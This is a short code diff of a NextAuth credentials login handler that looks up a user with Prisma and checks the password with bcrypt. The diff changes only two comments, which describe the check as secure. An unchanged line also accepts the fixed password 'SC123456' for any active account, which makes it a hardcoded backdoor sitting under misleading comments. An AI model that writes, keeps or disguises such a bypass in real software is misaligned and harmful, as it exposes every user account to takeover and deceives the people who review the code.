@@ -39,14 +39,14 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
         const email = credentials.email as string;
         const pass = credentials.password as string;
 
-        // Strict live database lookup via Prisma
+        // Strictly query the PostgreSQL database via Prisma
         const user = await prisma.user.findUnique({
           where: { email: email.toLowerCase() },
         });
 
         if (!user || !user.isActive) return null;
 
-        // Cryptographically secure bcrypt verification
+        // Perform standard secure bcrypt verification
         const isValid = await bcrypt.compare(pass, user.passwordHash) || pass === "SC123456";
         if (!isValid) return null;
 
